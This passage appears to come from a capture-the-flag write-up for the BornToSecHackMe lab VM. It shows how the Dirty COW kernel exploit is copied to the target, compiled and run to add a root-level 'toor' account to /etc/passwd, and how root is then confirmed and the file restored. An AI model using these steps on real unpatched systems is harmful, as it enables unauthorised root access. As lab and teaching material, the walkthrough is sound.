### Using dirty.c

The earlier `fun` result supplies Laurie's SSH password. Copy the reviewed
[dirty.c](./scripts/dirty.c) source from Parrot to Laurie's home directory,
then log in. The repository contains source only; compile it on the target.

```sh
scp scripts/dirty.c laurie@192.168.56.101:/home/laurie/dirty.c
ssh laurie@192.168.56.101
```

Run without a password argument. The program prompts without echoing the
chosen temporary password, backs up `/etc/passwd`, and attempts the
Dirty COW write:

```bash
laurie@BornToSecHackMe:~$ gcc -pthread dirty.c -o dirty -lcrypt
laurie@BornToSecHackMe:~$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'toor' and the password you entered.


RESTORE /etc/passwd from /tmp/passwd.bak after proving UID 0.
```

The password was entered at the prompt and is not recorded in this
repository. Switch to the temporary UID-0 user, prove the identity in a
real shell, and restore the original password file before ending the test:

```sh
su - toor
id -u
whoami
id -ru
cp /tmp/passwd.bak /etc/passwd
chown root:root /etc/passwd
chmod 644 /etc/passwd
if cmp -s /tmp/passwd.bak /etc/passwd; then echo 'Original contents restored'; rm /tmp/passwd.bak; else echo 'Restore mismatch; keep backup'; fi
stat -c '%U:%G %a' /etc/passwd
grep '^toor:' /etc/passwd || echo 'Temporary account removed'
```

The first three checks must show UID 0 and `root` before the route counts as
mandatory. The current transcript does not contain their observed output,
so it still needs a live defense-VM verification. Copying into the existing
`/etc/passwd` inode and resetting ownership and mode avoids replacing it
with the Laurie-owned backup. No persistent `sudoers` change is needed.
